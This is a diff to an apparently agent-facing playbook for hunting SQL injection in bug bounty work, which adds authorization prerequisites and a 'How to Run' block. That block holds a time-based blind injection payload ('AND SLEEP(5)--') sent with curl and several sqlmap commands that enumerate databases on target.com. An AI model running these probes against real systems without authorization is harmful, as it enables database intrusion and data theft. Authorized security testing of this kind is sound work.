@@ -12,6 +12,36 @@ tags: [sql, injection, hunt, redteam]
 
 Use when the target has any endpoint that interacts with a database — search, filter, sort, login, ID-based lookups, API parameters, or any user input that could be used in a query. SQL injection (including NoSQL injection) remains one of the highest-paying vulnerability classes because it directly threatens data confidentiality, integrity, and availability. Every parameter in GET/POST/JSON/headers/cookies that reaches a backend database is a candidate. Highest-value targets: multi-tenant SaaS platforms, e-commerce/payment systems, search endpoints, analytics subdomains, and third-party plugins.
 
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `mysql`, `sqlmap`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Baseline
+curl --max-time 30 --connect-timeout 10 -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"
+
+# Inject
+curl --max-time 30 --connect-timeout 10 -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)--"
+
+# SQLMap quick scan
+sqlmap -u "https://target.com/search?q=test" --dbs --level=3 --risk=2 --batch
+
+# SQLMap with POST
+sqlmap -u "https://target.com/api/filter" --data="category=electronics&sort=price" --dbs --batch
+
+# SQLMap with cookie auth
+sqlmap -u "https://target.com/admin/report" --cookie="session=TOKEN" --dbs --batch --level=5
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 SQL injection remains one of the highest-paying vulnerability classes in bug bounty because it directly threatens data confidentiality, integrity, and availability at scale.
